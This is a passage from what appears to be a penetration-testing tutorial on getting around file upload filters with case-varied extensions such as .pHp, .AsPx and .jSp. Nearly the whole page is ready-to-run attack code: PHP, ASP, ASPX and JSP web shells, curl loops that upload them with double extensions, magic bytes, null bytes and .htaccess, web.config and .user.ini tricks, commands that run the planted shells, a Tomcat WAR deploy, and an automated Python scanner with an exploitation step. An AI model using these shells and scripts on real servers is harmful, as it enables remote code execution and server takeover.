  Content-Type: image/jpeg

  <?php system($_GET["cmd"]); ?>
  ------Boundary--

  # 5. Payload list — paste all permutations:
  php
  phP
  pHp
  pHP
  Php
  PhP
  PHp
  PHP
  phtml
  pHtml
  phTml
  pHtMl
  PHTML
  Phtml
  phtmL
  phTmL
  pHtML
  PHtml
  pHTml
  pHTMl
  pHTML
  php5
  phP5
  pHp5
  pHP5
  Php5
  PhP5
  PHp5
  PHP5
  php7
  PHP7
  pHp7
  Php7
  pht
  phT
  pHt
  pHT
  Pht
  PhT
  PHt
  PHT
  phar
  phaR
  phAr
  phAR
  pHar
  pHaR
  pHAr
  pHAR
  Phar
  PhaR
  PhAr
  PhAR
  PHar
  PHaR
  PHAr
  PHAR
  inc
  inC
  iNc
  iNC
  Inc
  InC
  INc
  INC
  shtml
  Shtml
  sHtml
  shTml
  shtMl
  shtmL
  SHTML
  sHtMl

  # 6. Grep Extract:
  #    Add regex: "success|uploaded|saved|url|path"
  #    to identify accepted uploads

  # 7. Grep Match:
  #    Add: "error|blocked|invalid|not allowed"
  #    to identify blocked uploads

  # 8. Settings:
  #    - Throttle: 200ms between requests
  #    - Follow redirects: Yes
  #    - Max retries: 2

  # 9. After scan: Sort by response length to find anomalies
  #    Different response = possible bypass
  ```
  :::
::

### Combined Bypass Techniques

::warning
Case-sensitive bypass is most powerful when combined with other file upload bypass techniques. Each combination multiplies the attack surface exponentially.
::

::accordion
  :::accordion-item{icon="i-lucide-combine" label="Case Variation + Double Extension"}
  ```bash
  # ── Combine case bypass with double extension ──
  # shell.pHp.jpg — first extension may be used for execution
  # shell.jpg.PhP — last extension may be used for execution

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"
  SHELL='<?php system($_GET["cmd"]); ?>'

  echo "$SHELL" > /tmp/case_shell.txt

  # Case-varied first extension + safe second extension
  for php_ext in pHp PhP PHP Php pHP PHp phP pHtMl PHTML; do
      for safe_ext in jpg jpeg png gif bmp pdf txt; do
          # First.Second pattern
          FNAME="shell.${php_ext}.${safe_ext}"
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@/tmp/case_shell.txt;filename=${FNAME};type=image/jpeg" \
            -H "Cookie: $COOKIE")
          [ "$STATUS" = "200" ] && echo "[+] .${php_ext}.${safe_ext} — ACCEPTED"

          # Second.First pattern
          FNAME="shell.${safe_ext}.${php_ext}"
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@/tmp/case_shell.txt;filename=${FNAME};type=image/jpeg" \
            -H "Cookie: $COOKIE")
          [ "$STATUS" = "200" ] && echo "[+] .${safe_ext}.${php_ext} — ACCEPTED"
      done
  done

  rm -f /tmp/case_shell.txt
  ```
  :::

  :::accordion-item{icon="i-lucide-combine" label="Case Variation + Magic Bytes"}
  ```bash
  # ── Combine case bypass with magic byte forgery ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # Create files with magic bytes + PHP + case-varied extensions
  for ext in pHp PhP PHP Php pHP PHp pHtMl PHTML Php5 PHP5; do
      # JPEG magic + PHP
      printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > "/tmp/magic_${ext}"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/magic_${ext};filename=avatar.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] JPEG magic + .${ext} — ACCEPTED"

      # GIF magic + PHP
      echo -n "GIF89a<?php system(\$_GET['cmd']); ?>" > "/tmp/magic_gif_${ext}"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/magic_gif_${ext};filename=avatar.${ext};type=image/gif" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] GIF magic + .${ext} — ACCEPTED"

      # PNG magic + PHP
      printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > "/tmp/magic_png_${ext}"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/magic_png_${ext};filename=avatar.${ext};type=image/png" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] PNG magic + .${ext} — ACCEPTED"
  done

  rm -f /tmp/magic_*
  ```
  :::

  :::accordion-item{icon="i-lucide-combine" label="Case Variation + Null Byte (Legacy)"}
  ```bash
  # ── Combine case bypass with null byte injection (PHP < 5.3.4) ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo '<?php system($_GET["cmd"]); ?>' > /tmp/null_case.txt

  for ext in pHp PhP PHP Php pHP; do
      for null in "%00" "%2500" "%c0%80"; do
          for safe in jpg png gif; do
              FNAME="shell.${ext}${null}.${safe}"
              STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
                -F "${FIELD}=@/tmp/null_case.txt;filename=${FNAME}" \
                -H "Cookie: $COOKIE")
              [ "$STATUS" = "200" ] && echo "[+] .${ext}${null}.${safe} — ACCEPTED"
          done
      done
  done

  rm -f /tmp/null_case.txt
  ```
  :::

  :::accordion-item{icon="i-lucide-combine" label="Case Variation + Content-Type Mismatch"}
  ```bash
  # ── Combine case bypass with Content-Type manipulation ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo '<?php system($_GET["cmd"]); ?>' > /tmp/ct_case.txt

  CONTENT_TYPES=(
      "image/jpeg"
      "image/png"
      "image/gif"
      "image/bmp"
      "application/octet-stream"
      "image/x-png"
      "image/pjpeg"
      "text/plain"
      "application/x-httpd-php"  # Some apps honor this
      "image/webp"
  )

  for ext in pHp PhP PHP Php pHtMl PHTML pHp5 PHP5; do
      for ct in "${CONTENT_TYPES[@]}"; do
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@/tmp/ct_case.txt;filename=shell.${ext};type=${ct}" \
            -H "Cookie: $COOKIE")
          [ "$STATUS" = "200" ] && echo "[+] .${ext} + CT:${ct} — ACCEPTED"
      done
  done

  rm -f /tmp/ct_case.txt
  ```
  :::

  :::accordion-item{icon="i-lucide-combine" label="Case Variation + Trailing Characters"}
  ```bash
  # ── Combine case bypass with trailing dots, spaces, special chars ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo '<?php system($_GET["cmd"]); ?>' > /tmp/trail_case.txt

  for ext in pHp PhP PHP Php; do
      TRAILS=(
          "${ext}."            # Trailing dot
          "${ext} "            # Trailing space
          "${ext}..."          # Multiple dots
          "${ext}...."         # More dots
          "${ext}:::\$DATA"    # NTFS ADS (Windows/IIS)
          "${ext}%20"          # URL-encoded space
          "${ext}%0a"          # Newline
          "${ext}%0d"          # Carriage return
          "${ext}%00"          # Null byte
          "${ext};"            # Semicolon
          "${ext}%09"          # Tab
      )

      for trail in "${TRAILS[@]}"; do
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@/tmp/trail_case.txt;filename=shell.${trail};type=image/jpeg" \
            -H "Cookie: $COOKIE" 2>/dev/null)
          [ "$STATUS" = "200" ] && echo "[+] .${trail} — ACCEPTED"
      done
  done

  rm -f /tmp/trail_case.txt
  ```
  :::

  :::accordion-item{icon="i-lucide-combine" label="Case Variation + .htaccess Chain"}
  ```bash
  # ── Upload .htaccess with case variation + then upload shell with image ext ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # Stage 1: Try uploading .htaccess with case variations
  HTACCESS_CONTENT='AddType application/x-httpd-php .jpg .png .gif
  php_flag engine on'

  for ht_name in ".htaccess" ".Htaccess" ".hTaccess" ".htAccess" \
                  ".HTACCESS" ".HtAcCeSs" ".HTAccess" ".htACCESS"; do
      echo "$HTACCESS_CONTENT" > /tmp/htaccess_case.txt
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/htaccess_case.txt;filename=${ht_name}" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] ${ht_name} — ACCEPTED"
  done

  # Stage 2: Upload shell with image extension (if .htaccess upload worked)
  echo '<?php system($_GET["cmd"]); ?>' > /tmp/img_shell.txt
  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/img_shell.txt;filename=shell.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # Stage 3: Verify execution
  curl -s "https://target.com/uploads/shell.jpg?cmd=id"

  rm -f /tmp/htaccess_case.txt /tmp/img_shell.txt
  ```
  :::
::

---

## Server-Specific Exploitation

### Apache

::tabs
  :::tabs-item{icon="i-lucide-server" label="Apache mod_php"}
  ```bash
  # ── Apache with mod_php — case-insensitive handler by default ──

  # Apache's AddHandler/AddType directives match case-insensitively
  # The PHP handler recognizes .PHP .pHp .Php etc.

  # Verify Apache PHP handler case sensitivity
  # Create test files (if you have write access or via upload)
  for ext in php PHP pHp Php PhP pHP PHp phP; do
      echo "<?php echo 'Extension: .${ext} executed!'; ?>" > "test_case.${ext}"
      # Upload each
      curl -s -X POST "https://target.com/api/upload" \
        -F "file=@test_case.${ext};type=image/jpeg" \
        -H "Cookie: session=TOKEN"
  done

  # Check which ones execute
  for ext in php PHP pHp Php PhP pHP PHp phP; do
      RESULT=$(curl -s "https://target.com/uploads/test_case.${ext}" 2>/dev/null)
      if echo "$RESULT" | grep -q "executed"; then
          echo "[+] Apache executes .${ext} as PHP"
      elif echo "$RESULT" | grep -q "<?php"; then
          echo "[-] Apache serves .${ext} as text (handler not matching)"
      fi
  done

  # ── Apache configuration that causes this ──
  # In httpd.conf or apache2.conf:
  # <FilesMatch \.php$>                ← case-SENSITIVE regex
  #     SetHandler application/x-httpd-php
  # </FilesMatch>
  #
  # vs.
  #
  # <FilesMatch "\.(?i)php$">          ← case-INSENSITIVE regex
  #     SetHandler application/x-httpd-php
  # </FilesMatch>
  #
  # Most default Apache+PHP installations use AddHandler which is case-insensitive:
  # AddHandler application/x-httpd-php .php
  # This matches .PHP .pHp etc. on most systems

  # ── Check Apache config for case sensitivity ──
  # If you have LFI or shell access:
  curl -s "https://target.com/shell.php?cmd=grep+-ri+php+/etc/apache2/mods-enabled/"
  curl -s "https://target.com/shell.php?cmd=cat+/etc/apache2/mods-enabled/php*.conf"
  ```
  :::

  :::tabs-item{icon="i-lucide-server" label="Apache .htaccess Abuse"}
  ```bash
  # ── Force PHP execution for case-varied extensions via .htaccess ──

  # If .htaccess upload is possible, ensure all case variants execute

  # .htaccess to handle case-insensitive PHP extensions
  cat > .htaccess << 'EOF'
  # Force PHP execution for any case variation
  <FilesMatch "\.(?i)(php|phtml|php5|php7|pht|phps|phar)$">
      SetHandler application/x-httpd-php
  </FilesMatch>

  # Alternative: AddType for specific case variants
  AddType application/x-httpd-php .PHP .pHp .Php .PhP .pHP .PHp .phP
  AddType application/x-httpd-php .PHTML .pHtml .Phtml .pHtMl
  AddType application/x-httpd-php .PHP5 .pHp5 .Php5 .PHP7 .pHp7
  AddType application/x-httpd-php .PHT .pHt .PhT

  # Also allow image extensions to run as PHP (for polyglot chain)
  AddType application/x-httpd-php .jpg .jpeg .png .gif

  # Enable PHP engine
  php_flag engine on
  EOF

  # Upload .htaccess
  curl -X POST "https://target.com/api/upload" \
    -F "file=@.htaccess;filename=.htaccess" \
    -H "Cookie: session=TOKEN"

  # Now upload shell with any case variation
  echo '<?php system($_GET["cmd"]); ?>' > shell.pHp
  curl -X POST "https://target.com/api/upload" \
    -F "file=@shell.pHp;type=image/jpeg" \
    -H "Cookie: session=TOKEN"

  curl -s "https://target.com/uploads/shell.pHp?cmd=id"
  ```
  :::
::

### IIS (Windows)

::tabs
  :::tabs-item{icon="i-lucide-server" label="IIS Case Insensitivity"}
  ```bash
  # ── IIS on Windows — ALWAYS case-insensitive ──
  # NTFS filesystem is case-insensitive
  # IIS handler mapping is case-insensitive
  # .ASP .aSp .Asp .asp all execute identically

  # ASP Classic case variants
  for ext in asp aSp AsP ASP Asp ASp asP aSpaspx aSpX AsPx ASPX Aspx aSPx asPX ASpx; do
      echo '<%eval request("cmd")%>' > "/tmp/case_asp.txt"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        "https://target.com/api/upload" \
        -F "file=@/tmp/case_asp.txt;filename=shell.${ext}" \
        -H "Cookie: session=TOKEN")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} — ACCEPTED on IIS"
  done

  # ASPX case variants
  for ext in aspx aSpX AsPx ASPX Aspx aSPx asPX; do
      cat > /tmp/aspx_shell.txt << 'ASPXEOF'
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <script runat="server">
  protected void Page_Load(object s, EventArgs e) {
      string c = Request["cmd"];
      if (c != null) {
          Process p = new Process();
          p.StartInfo.FileName = "cmd.exe";
          p.StartInfo.Arguments = "/c " + c;
          p.StartInfo.RedirectStandardOutput = true;
          p.StartInfo.UseShellExecute = false;
          p.Start();
          Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
      }
  }
  </script>
  ASPXEOF

      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        "https://target.com/api/upload" \
        -F "file=@/tmp/aspx_shell.txt;filename=shell.${ext}" \
        -H "Cookie: session=TOKEN")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} — ACCEPTED"
  done

  # ── IIS-specific extensions with case variations ──
  for ext in aSa CeR AsHx AsMx AsCx cShTmL vBhTmL; do
      echo '<%eval request("cmd")%>' > "/tmp/iis_ext.txt"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        "https://target.com/api/upload" \
        -F "file=@/tmp/iis_ext.txt;filename=shell.${ext}" \
        -H "Cookie: session=TOKEN")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} — ACCEPTED (IIS special ext)"
  done

  # ── IIS short filename (8.3) bypass ──
  # Windows creates 8.3 short filenames automatically
  # shell.aspx → SHELL~1.ASP (may bypass extension check)
  curl -s "https://target.com/SHELL~1.ASP?cmd=id"
  curl -s "https://target.com/uploads/SHELL~1.ASP?cmd=id"

  # ── IIS web.config with case variation ──
  for wc in "web.config" "Web.Config" "WEB.CONFIG" "web.CONFIG" "Web.config"; do
      cat > /tmp/web_config.txt << 'WCEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="web_config" path="*.jpg" verb="*"
             modules="IsapiModule"
             scriptProcessor="%windir%\system32\inetsrv\asp.dll"
             resourceType="Unspecified" />
      </handlers>
    </security>
    </system.webServer>
  </configuration>
  WCEOF

      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        "https://target.com/api/upload" \
        -F "file=@/tmp/web_config.txt;filename=${wc}" \
        -H "Cookie: session=TOKEN")
      [ "$STATUS" = "200" ] && echo "[+] ${wc} — UPLOADED"
  done

  rm -f /tmp/case_asp.txt /tmp/aspx_shell.txt /tmp/iis_ext.txt /tmp/web_config.txt
  ```
  :::
::

### Nginx + PHP-FPM

::tabs
  :::tabs-item{icon="i-lucide-server" label="Nginx Case Sensitivity"}
  ```bash
  # ── Nginx location blocks and case sensitivity ──

  # Nginx uses regex for location matching:
  # location ~ \.php$    → case-SENSITIVE (~ flag)
  #   Only matches .php, NOT .PHP or .pHp
  #
  # location ~* \.php$   → case-INSENSITIVE (~* flag)
  #   Matches .php, .PHP, .pHp, etc.
  #
  # Many default configs use ~* (case-insensitive)

  # Test case sensitivity of Nginx PHP handler
  for ext in php PHP pHp Php; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/nonexistent.${ext}" 2>/dev/null)
      echo "[${STATUS}] .${ext}"
      # 502/503 = PHP-FPM tried to process (handler matched)
      # 404 = Nginx served 404 (handler didn't match)
      # 403 = File exists but forbidden
  done

  # ── Nginx path_info exploitation ──
  # If Nginx passes to PHP-FPM via path_info:
  # /uploads/shell.jpg/anything.php → PHP-FPM executes shell.jpg as PHP
  # Combine with case bypass:
  curl -s "https://target.com/uploads/shell.jpg/x.pHp?cmd=id"
  curl -s "https://target.com/uploads/shell.jpg/x.PhP?cmd=id"
  curl -s "https://target.com/uploads/shell.jpg/.PHP?cmd=id"

  # ── Test Nginx configuration ──
  # Common vulnerable Nginx configs:
  #
  # location ~* \.php$ {            ← Case-insensitive → .PHP executes
  #     fastcgi_pass unix:/run/php/php-fpm.sock;
  #     include fastcgi_params;
  #     fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
  # }
  #
  # Dangerous cgi.fix_pathinfo=1 in php.ini allows:
  # /uploads/avatar.jpg/nonexistent.php → executes avatar.jpg as PHP

  # ── .user.ini for PHP-FPM ──
  # PHP-FPM checks for .user.ini in each directory
  for ini_name in ".user.ini" ".User.ini" ".USER.INI" ".user.INI"; do
      echo "auto_prepend_file=shell.gif" > /tmp/user_ini.txt
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        "https://target.com/api/upload" \
        -F "file=@/tmp/user_ini.txt;filename=${ini_name}" \
        -H "Cookie: session=TOKEN")
      [ "$STATUS" = "200" ] && echo "[+] ${ini_name} — UPLOADED"
  done

  rm -f /tmp/user_ini.txt
  ```
  :::
::

### Java / Tomcat

::tabs
  :::tabs-item{icon="i-lucide-server" label="Tomcat JSP Case Bypass"}
  ```bash
  # ── Tomcat / Java Servlet containers ──

  # Tomcat on Linux: filesystem is case-sensitive
  # Tomcat on Windows: filesystem is case-insensitive
  # Tomcat's DefaultServlet and JspServlet: usually case-sensitive on Linux

  # But: Tomcat has had case-sensitivity bugs:
  # CVE-2008-2938: Tomcat case-sensitivity bypass on Windows

  # JSP case variants
  for ext in jSp JsP JSP Jsp JSp jsP jSP \
             jSpX JsPx JSPX Jspx jSPx \
             jSw JsW JSW Jsw \
             jSv JsV JSV Jsv; do

      JSP_SHELL='<%@ page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});Scanner s=new Scanner(p.getInputStream()).useDelimiter("\\\\A");out.println(s.hasNext()?s.next():"");}%>'

      echo "$JSP_SHELL" > /tmp/jsp_case.txt
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        "https://target.com/api/upload" \
        -F "file=@/tmp/jsp_case.txt;filename=shell.${ext}" \
        -H "Cookie: session=TOKEN")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} — ACCEPTED"
  done

  # Verify execution
  for ext in jSp JsP JSP Jsp; do
      RESULT=$(curl -s "https://target.com/uploads/shell.${ext}?cmd=id" 2>/dev/null)
      if echo "$RESULT" | grep -q "uid="; then
          echo "[+] EXECUTED: .${ext}"
      fi
  done

  # ── WAR file case variation ──
  # Tomcat auto-deploys .war files
  for ext in wAr WaR WAR War WAr waR; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
        "https://target.com/manager/text/deploy?path=/pwned" \
        --upload-file shell.war \
        -H "Content-Type: application/octet-stream" 2>/dev/null)
      echo "[${STATUS}] .${ext}"
  done

  rm -f /tmp/jsp_case.txt
  ```
  :::
::

---

## Automated Scanning

### ffuf Case Permutation Fuzzing

::code-group
```bash [Extension Fuzzing]
# ── ffuf with case permutation wordlist ──

# Generate wordlist first
python3 -c "
from itertools import product
exts = ['php','phtml','php5','php7','pht','phar','phps','inc','pgif','shtml',
        'asp','aspx','ashx','asa','cer','jsp','jspx','jsw','cfm','cgi']
for ext in exts:
    for combo in product(*[(c.lower(),c.upper()) if c.isalpha() else (c,) for c in ext]):
        print(''.join(combo))
" > case_extensions.txt

echo "[+] Generated $(wc -l < case_extensions.txt) case permutations"

# ── Method 1: Fuzz extension in filename ──
# Requires creating a test upload request file first
# Use Burp to capture the request, save as raw request

# ── Method 2: ffuf with match/filter ──
# Upload a shell via curl in a loop, using ffuf-style parallel execution

# Create upload test script
cat > /tmp/case_fuzz.sh << 'FUZZEOF'
#!/bin/bash
EXT="$1"
UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"
SHELL='<?php echo "CASEFUZZ"; ?>'

RESP=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
  -F "file=@-;filename=test.${EXT};type=image/jpeg" \
  -H "Cookie: $COOKIE" <<< "$SHELL" 2>/dev/null)

echo "${RESP} ${EXT}"
FUZZEOF
chmod +x /tmp/case_fuzz.sh

# Run parallel (using xargs for parallelism)
cat case_extensions.txt | xargs -P 10 -I{} /tmp/case_fuzz.sh {} | grep "^200" | \
  awk '{print "[+] ACCEPTED: ." $2}'

rm -f /tmp/case_fuzz.sh
```

```bash [Response-Based Detection]
# ── Detect case bypass via response analysis ──

UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"
FIELD="file"
SHELL='<?php echo "CASETEST"; ?>'

# Get baseline (blocked) response
BASELINE=$(curl -s -X POST "$UPLOAD_URL" \
  -F "${FIELD}=@-;filename=test.php;type=image/jpeg" \
  -H "Cookie: $COOKIE" <<< "$SHELL")
BASELINE_SIZE=${#BASELINE}

echo "[*] Baseline (blocked .php) response size: ${BASELINE_SIZE}"

# Test each case permutation and compare
python3 -c "
from itertools import product
for combo in product(*[(c.lower(),c.upper()) for c in 'php']):
    print(''.join(combo))
" | while read ext; do
    RESP=$(curl -s -X POST "$UPLOAD_URL" \
      -F "${FIELD}=@-;filename=test.${ext};type=image/jpeg" \
      -H "Cookie: $COOKIE" <<< "$SHELL" 2>/dev/null)
    RESP_SIZE=${#RESP}

    # Compare with baseline
    SIZE_DIFF=$((RESP_SIZE - BASELINE_SIZE))
    if [ "$SIZE_DIFF" -gt 50 ] || [ "$SIZE_DIFF" -lt -50 ]; then
        echo "[+] ANOMALY: .${ext} — response size diff: ${SIZE_DIFF}"
    fi
done
```

```bash [Nuclei Template]
# Save as case-bypass-upload.yaml
cat > case-bypass-upload.yaml << 'YAMLEOF'
id: case-sensitive-extension-bypass

info:
  name: Case-Sensitive Extension Bypass in File Upload
  author: bughunter
  severity: critical
  tags: file-upload,case-bypass,rce
  description: |
    Tests if file upload validation uses case-sensitive extension checking
    while the web server handles extensions case-insensitively.
  reference:
    - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
    - https://cwe.mitre.org/data/definitions/178.html

# Note: Nuclei has limited file upload support
# Use this to discover upload endpoints
http:
  - method: GET
    path:
      - "{{BaseURL}}/test_case.PHP"
      - "{{BaseURL}}/test_case.pHp"
      - "{{BaseURL}}/test_case.Php"
    matchers:
      - type: status
        status:
          - 403
          - 500
          - 502
        # 403/500/502 = server recognizes extension as PHP
        # (handler is active for case variants)
YAMLEOF

nuclei -u https://target.com -t case-bypass-upload.yaml
```
::

### Comprehensive Scanner

::code-collapse
```python [case_bypass_scanner.py]
#!/usr/bin/env python3
"""
Case-Sensitive Extension Bypass Scanner
Complete automated detection and exploitation workflow
"""
import requests
import itertools
import time
import json
import sys
import os
import urllib3
urllib3.disable_warnings()

class CaseBypassScanner:
    """Full automated case-sensitive extension bypass scanner"""

    SERVER_SIDE_EXTENSIONS = {
        'php': {
            'exts': ['php', 'phtml', 'php5', 'php7', 'php4', 'pht', 'phps', 'phar', 'pgif', 'inc'],
            'shell': '<?php echo "CASE_BYPASS_MARKER"; system($_GET["cmd"]); ?>',
            'verify_string': 'CASE_BYPASS_MARKER',
            'content_types': ['image/jpeg', 'image/png', 'application/octet-stream'],
        },
        'asp': {
            'exts': ['asp', 'asa', 'cer'],
            'shell': '<%eval request("cmd")%>',
            'verify_string': '',
            'content_types': ['image/jpeg', 'application/octet-stream'],
        },
        'aspx': {
            'exts': ['aspx', 'ashx', 'asmx', 'ascx'],
            'shell': '<%@ Page Language="C#" %><%Response.Write("CASE_BYPASS_MARKER");%>',
            'verify_string': 'CASE_BYPASS_MARKER',
            'content_types': ['image/jpeg', 'application/octet-stream'],
        },
        'jsp': {
            'exts': ['jsp', 'jspx', 'jsw', 'jsv', 'jspf'],
            'shell': '<%out.println("CASE_BYPASS_MARKER");%>',
            'verify_string': 'CASE_BYPASS_MARKER',
            'content_types': ['image/jpeg', 'application/octet-stream'],
        },
        'ssi': {
            'exts': ['shtml', 'stm'],
            'shell': '<!--#echo var="DOCUMENT_ROOT"-->CASE_BYPASS_MARKER',
            'verify_string': 'CASE_BYPASS_MARKER',
            'content_types': ['image/jpeg', 'text/plain'],
        },
        'config': {
            'exts': ['htaccess'],
            'shell': 'AddType application/x-httpd-php .jpg\nphp_flag engine on',
            'verify_string': '',
            'content_types': ['text/plain', 'application/octet-stream'],
        }
    }

    def __init__(self, upload_url, field="file", cookies=None, headers=None, verify_base=None):
        self.upload_url = upload_url
        self.field = field
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15

        if cookies:
            self.session.cookies.update(cookies)
        if headers:
            self.session.headers.update(headers)

        self.verify_base = verify_base or upload_url.rsplit('/', 2)[0]
        self.results = {'accepted': [], 'executed': [], 'server_info': {}}

    @staticmethod
    def case_perms(ext):
        """Generate all case permutations"""
        chars = []
        for c in ext:
            chars.append([c.lower(), c.upper()] if c.isalpha() else [c])
        return [''.join(combo) for combo in itertools.product(*chars)]

    def detect_server(self):
        """Fingerprint the web server"""
        try:
            r = self.session.get(self.verify_base, timeout=10)
            server = r.headers.get('Server', 'Unknown')
            powered = r.headers.get('X-Powered-By', 'Unknown')
            self.results['server_info'] = {
                'server': server, 'powered_by': powered,
                'likely_os': 'Windows' if 'IIS' in server else 'Linux'
            }
            print(f"[*] Server: {server}")
            print(f"[*] Powered-By: {powered}")
            print(f"[*] Likely OS: {self.results['server_info']['likely_os']}")
        except:
            pass

    def detect_handler_case_sensitivity(self):
        """Check if the web server handles extensions case-insensitively"""
        print("\n[*] Testing server handler case sensitivity...")
        for ext in ['php', 'PHP', 'pHp', 'Php']:
            try:
                r = self.session.get(f"{self.verify_base}/nonexistent_test.{ext}", timeout=5)
                status = r.status_code
                # 403/500/502/503 = handler recognized the extension
                # 404 = generic not found (handler didn't match)
                handler_active = status in [403, 500, 502, 503]
                indicator = "✓ Handler active" if handler_active else "✗ Not handled"
                print(f"    .{ext:6s} → [{status}] {indicator}")
            except:
                print(f"    .{ext:6s} → [ERR]")

    def test_upload(self, content, filename, content_type):
        """Upload a file and check result"""
        files = {self.field: (filename, content.encode() if isinstance(content, str) else content, content_type)}
        try:
            r = self.session.post(self.upload_url, files=files, timeout=15)
            success = r.status_code in [200, 201] and any(
                w in r.text.lower() for w in ['success', 'upload', 'saved', 'created', 'url', 'path', 'file']
            )
            return success, r.status_code, r.text
        except:
            return False, 0, ''

    def verify_execution(self, filename, verify_string):
        """Check if uploaded file executes server-side code"""
        dirs = ['', 'uploads/', 'files/', 'media/', 'images/', 'static/',
                'assets/', 'upload/', 'content/', 'data/', 'public/']
        for d in dirs:
            url = f"{self.verify_base}/{d}{filename}"
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    if verify_string and verify_string in r.text:
                        return url, True
                    elif '<?php' not in r.text and '<%' not in r.text and r.status_code == 200:
                        # Source not visible = might be executing
                        if len(r.text) > 0 and len(r.text) < 1000:
                            return url, False  # Exists but unsure about execution
            except:
                continue
        return None, False

    def scan(self, language='php', max_perms_per_ext=None, delay=0.3):
        """Run the full case bypass scan"""
        if language not in self.SERVER_SIDE_EXTENSIONS:
            print(f"[-] Unknown language: {language}")
            return

        config = self.SERVER_SIDE_EXTENSIONS[language]

        print(f"\n{'='*60}")
        print(f" Case-Sensitive Extension Bypass Scanner — {language.upper()}")
        print(f"{'='*60}")

        self.detect_server()
        self.detect_handler_case_sensitivity()

        print(f"\n[*] Testing {language} extension case permutations...")
        print(f"[*] Base extensions: {', '.join(config['exts'])}")
        print("-" * 60)

        total_tested = 0
        for base_ext in config['exts']:
            perms = self.case_perms(base_ext)

            # Skip lowercase original (likely blocked)
            perms_filtered = [p for p in perms if p != base_ext]

            if max_perms_per_ext:
                perms_filtered = perms_filtered[:max_perms_per_ext]

            for perm in perms_filtered:
                filename = f"casetest.{perm}"
                total_tested += 1

                for ct in config['content_types']:
                    success, status, resp = self.test_upload(config['shell'], filename, ct)

                    if success:
                        result = {
                            'extension': f'.{perm}',
                            'filename': filename,
                            'content_type': ct,
                            'base_ext': f'.{base_ext}'
                        }
                        self.results['accepted'].append(result)
                        print(f"[+] ACCEPTED: .{perm} (base: .{base_ext}, CT: {ct})")

                        # Verify execution
                        url, executed = self.verify_execution(filename, config['verify_string'])
                        if url and executed:
                            result['url'] = url
                            result['executed'] = True
                            self.results['executed'].append(result)
                            print(f"    [!!!] EXECUTED at: {url}")
                        elif url:
                            print(f"    [~] File exists: {url} (execution uncertain)")

                        break  # Don't test other CTs

                    time.sleep(delay / 3)

                time.sleep(delay)

        self._print_report(total_tested)
        return self.results

    def scan_all_languages(self, delay=0.3):
        """Scan all supported server-side languages"""
        for lang in self.SERVER_SIDE_EXTENSIONS:
            if lang != 'config':
                self.scan(lang, max_perms_per_ext=8, delay=delay)

    def _print_report(self, total_tested):
        """Print scan results"""
        print(f"\n{'='*60}")
        print(f"SCAN COMPLETE")
        print(f"{'='*60}")
        print(f"Total permutations tested: {total_tested}")
        print(f"Accepted uploads: {len(self.results['accepted'])}")
        print(f"Confirmed execution: {len(self.results['executed'])}")

